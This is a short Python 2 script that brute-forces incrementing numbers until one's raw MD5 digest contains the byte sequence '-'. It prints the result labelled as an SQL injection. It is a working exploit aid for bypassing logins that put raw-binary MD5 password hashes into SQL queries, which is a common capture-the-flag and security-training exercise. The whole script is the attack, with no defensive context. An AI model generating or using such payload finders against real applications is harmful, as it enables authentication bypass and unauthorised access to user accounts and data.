import md5
import time
start_time = time.time()

# we use the counter which is an incrementing number as a string,
# since generating a dictionary and incrementing through that is more complicated.
# given that the likely hood of '-' being in a hash is high as it is small enough we are bound
# to find a solution.

counter =0;
while True:
	counter = counter + 1
	m = md5.new()
	m.update(str(counter))
	out = m.digest()
	if "'-'" in out:
		print "Sql injection = "+str(counter)+" with hash= "+ out+ " Time taken:"+str(time.time() - start_time)
		break